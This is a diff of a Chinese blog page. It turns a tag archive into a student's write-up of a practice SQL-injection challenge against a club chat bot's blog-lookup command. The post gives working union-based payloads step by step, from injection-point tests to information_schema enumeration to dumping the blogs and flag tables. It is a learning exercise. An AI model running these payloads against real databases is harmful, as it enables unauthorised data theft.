@@ -6,15 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://l0tus.vip">
-  <title>Tag: 尝试随便写写，哇酷哇酷 | L0tus&#39; blog</title>
+  <title>谈谈近期学到的简单的东西(一) | L0tus&#39; blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="L0tus&#39; blog">
-<meta property="og:url" content="http://l0tus.vip/tags/%E5%B0%9D%E8%AF%95%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99%EF%BC%8C%E5%93%87%E9%85%B7%E5%93%87%E9%85%B7/index.html">
+  <meta name="description" content="兔兔的SQL注入 write up   兔兔是Vidar协会的机器人，具有迎新、查询博客、printf等功能，其中%blog功能即是查询博客，由于其目前设计较为简单，通过SQL注入可以对其进行攻击。对于”攻击”这个概念，我最初以为只有”破坏”的意思，后来从ek1ng学长那里明白”获取其数据库所有数据””获取本查询不到的数据”都是对其攻击的表现。这个小游戏有两个目标：1、一次性查出所有学长的blog">
+<meta property="og:type" content="article">
+<meta property="og:title" content="谈谈近期学到的简单的东西(一)">
+<meta property="og:url" content="http://l0tus.vip/2022/08/01/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
 <meta property="og:site_name" content="L0tus&#39; blog">
+<meta property="og:description" content="兔兔的SQL注入 write up   兔兔是Vidar协会的机器人，具有迎新、查询博客、printf等功能，其中%blog功能即是查询博客，由于其目前设计较为简单，通过SQL注入可以对其进行攻击。对于”攻击”这个概念，我最初以为只有”破坏”的意思，后来从ek1ng学长那里明白”获取其数据库所有数据””获取本查询不到的数据”都是对其攻击的表现。这个小游戏有两个目标：1、一次性查出所有学长的blog">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-08-01T15:13:00.000Z">
+<meta property="article:modified_time" content="2022-08-01T16:57:57.489Z">
 <meta property="article:author" content="L0tus">
-<meta property="article:tag" content="C++">
+<meta property="article:tag" content="仲夏">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="L0tus&#39; blog" type="application/atom+xml">
@@ -162,64 +166,196 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-知识回顾（一）" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/07/29/%E8%B5%B7%E7%82%B9/" class="archive-article-date">
-  	<time datetime="2022-07-29T15:04:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-07-29</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/07/29/%E8%B5%B7%E7%82%B9/">STARTING POINT</a>
+    <h1 class="article-title" itemprop="name">
+      谈谈近期学到的简单的东西(一)
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        <!--显示阅读次数-->
+        
+          <br/>
+         <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+         <span class="icon-sort"></span>
+         <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+          	阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+          </span>
+          </a>
+        
+        <!--显示阅读次数完毕-->
+        
+        <a href="/2022/08/01/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%EF%BC%88%E4%B8%80%EF%BC%89/" class="archive-article-date">
+  	<time datetime="2022-08-01T15:13:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-08-01</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="兔兔的SQL注入-write-up"><a href="#兔兔的SQL注入-write-up" class="headerlink" title="兔兔的SQL注入 write up"></a>兔兔的SQL注入 write up</h1><p>   兔兔是Vidar协会的机器人，具有迎新、查询博客、printf等功能，其中%blog功能即是查询博客，由于其目前设计较为简单，通过SQL注入可以对其进行攻击。对于”攻击”这个概念，我最初以为只有”破坏”的意思，后来从ek1ng学长那里明白”获取其数据库所有数据””获取本查询不到的数据”都是对其攻击的表现。这个小游戏有两个目标：1、一次性查出所有学长的blog 2、找到flag。<br>   那就来试试简单的SQL注入吧~<br>   <span id="more"></span></p>
+<hr>
+<h2 id="1、页面观察"><a href="#1、页面观察" class="headerlink" title="1、页面观察"></a>1、页面观察</h2><p>   首先要判断出其注入类型，输入以下内容<br>   <code>%blog ek1ng&quot;#</code><br>   其实我一开始便猜测其注入类型为字符串，便直接在ek1ng学长的id后面直接加了 “ ,其中#的作用为将其后面的代码注释掉（不同地方的符号使用不同，例如mysql网站中注释符使用的是–+），兔兔的反馈是ek1ng学长的个人blog，再尝试一下把 “ 去掉（其实也不需要尝试）<br>   <code>%blog ek1ng #</code><br>   兔兔的反馈是vidar官网的网址，这就意味着语法不正确出现报错，从此可以判断出是字符型注入。<br>   同时也可以猜测出兔兔内置的sql语句为<br>   <code>select form &quot;数据表名&quot; where &quot;blog的字段值&quot; = &quot;</code></p>
+<h2 id="2、注入点判断"><a href="#2、注入点判断" class="headerlink" title="2、注入点判断"></a>2、注入点判断</h2><p>   分别输入以下代码<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%blog ek1ng&quot; and 1 = 1#  不报错</span><br><span class="line">%blog ek1ng&quot; and 1 = 2#  报错</span><br></pre></td></tr></table></figure><br>   显然，注入点为引号</p>
+<h2 id="3、判断当前表的字段数"><a href="#3、判断当前表的字段数" class="headerlink" title="3、判断当前表的字段数"></a>3、判断当前表的字段数</h2><p>   使用order by指令，通过列数递增直到报错便可判断列数，不过这里我从3开始试探，结果报错了，再到2也报错，于是确定列数只有1，（其结构还是比较简单的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%blog ek1ng&quot; order by 3# 报错</span><br><span class="line">%blog ek1ng&quot; order by 2# 报错</span><br><span class="line">%blog ek1ng&quot; order by 1# 显示正常</span><br></pre></td></tr></table></figure>
+<p>   可以判断列数只有1</p>
+<h2 id="4、判断显示位"><a href="#4、判断显示位" class="headerlink" title="4、判断显示位"></a>4、判断显示位</h2><p>   当然这个是用在显示位较多的题目当中，具体做法是：当让第一步查找为false时，其回显不会出现多于成分，其后紧跟union select 1,2,3···#<br>   当然兔兔这里显示位只有1，所以根本不需要这一步，<del>但是愚蠢的l0tus还是尝试了1，2，3</del></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%blog &quot; union select 1,2,3#  报错</span><br><span class="line">%blog &quot; union select 1,2#    报错</span><br><span class="line">%blog &quot; union select 1#      回显正常，回复为1</span><br></pre></td></tr></table></figure>
+<h2 id="5、爆数据库名"><a href="#5、爆数据库名" class="headerlink" title="5、爆数据库名"></a>5、爆数据库名</h2><p>   其详细步骤应该为，在第一步查找为false时，根据上一步显示位的输出判断对应的列数，并在联合查找时将该列数位置的查找值改为database()，目的也就是让数据库名回显在我们想要的显示位。不过兔兔这里的数据库结构比较简单，回显位置只有一个，列数也只有1，于是注入语句直接这么写：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%blog &quot; union select database()#</span><br></pre></td></tr></table></figure>
+<p>   其回显值为blog，那么这个数据库的名字就叫blog</p>
+<h2 id="6、爆数据表名"><a href="#6、爆数据表名" class="headerlink" title="6、爆数据表名"></a>6、爆数据表名</h2><p>   第一步查找为false时，利用联合查找来获得数据表名，这一步主要就是一些SQL语法的问题。GROUP_CONCAT(xxx)：是将分组中括号里对应的字符串进行连接，如果分组中括号里的参数xxx有多行，那么就会将这多行的字符串连接，每个字符串之间会有特定的符号进行分隔（也就是一起输出）。当然这里只有一个table_name。其中information_schema.tables表示库中所有表的信息，包括这个表从属的库。那么其后的table.schema &#x3D; database()表示所查找的表从属的库等于我们之前查过的database（），于是可以查出我们需要的库里所有的名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%blog &quot; union select group_contcat(table_name) from information_schema.tables where table_schema = database()#</span><br><span class="line">回显结果为：blogs,flag   显然，我们的第一个目标就在blogs里，第二个目标就在flag中</span><br></pre></td></tr></table></figure>
+<h2 id="7、爆表中字段名"><a href="#7、爆表中字段名" class="headerlink" title="7、爆表中字段名"></a>7、爆表中字段名</h2><p>   知道了表的名字我们下一步要做的就是查出这个表里的所有字段名字，这一步与上一步类似，将表中的字段名并列输出即可。其中table_schema表示库名，table_name表示表名，我们先后对blogs表和flag表下手</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%blog &quot; union select group_concat(column_name) from information_schema.columns where table_schema = &quot;blog&quot; and table_name = &quot;blogs&quot;#</span><br><span class="line">回显结果为：blog，id，nickname   分别对应了学长们的博客，序号，昵称</span><br><span class="line">%blog &quot; union select group_concat(column_name) from information_schema.columns where table_schema = &quot;blog&quot; and table_name = &quot;flag&quot;#</span><br><span class="line">回显结果为：flag，id</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="8、爆字段数据"><a href="#8、爆字段数据" class="headerlink" title="8、爆字段数据"></a>8、爆字段数据</h2><p>   这是最后一步了，也就是获取数据完成一次攻击，其语句反而最简单，大家应该一眼就看懂了吧~</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%blog &quot; union select group_concat(blog,&quot;--&quot;,id,&quot;--&quot;,nickname) from blogs#</span><br><span class="line">回显结果为所有学长的数据，比较长，这里就不展示啦</span><br><span class="line">%blog &quot; union select group_concat(flag,&quot;--&quot;,id) from flag# （其实完全可以简化成%blog &quot;union select flag form flag #）</span><br><span class="line">回显结果为：VidarTeam&#123;Welcome_To_The_Web_World_XD&#125;--1    OHHHHH!人生第一个flag拿到啦！</span><br></pre></td></tr></table></figure>
+<h2 id="9、本文的最后"><a href="#9、本文的最后" class="headerlink" title="9、本文的最后"></a>9、本文的最后</h2><p>   现在是08-02 0:45 写完了这篇文章<br>   首先，感谢您的驻足，祝您永生愉悦！<br>   这道小入门题是上周二也就是七天前做出来的，现在把解题过程再呈现一遍，也算是自己复习的过程，回头看看发现知识点确实需要经常回顾，兔兔这道题采用的是SQL注入，是web安全的学习中必不可少的知识点，也是这道题极大激发了我对web的兴趣而且给了我一点点成就感，这里需要感谢ek1ng学长的耐心指导，<del>也感谢他的奶茶</del>。<br>   希望以后可以在web安全的路上越走越远，也希望能早日加入Vidar!</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">尝试随便写写，哇酷哇酷</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">我的第一篇文章</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">仲夏</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://l0tus.vip/2022/08/01/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%EF%BC%88%E4%B8%80%EF%BC%89/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2022/07/29/%E8%B5%B7%E7%82%B9/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">STARTING POINT</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -242,9 +378,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
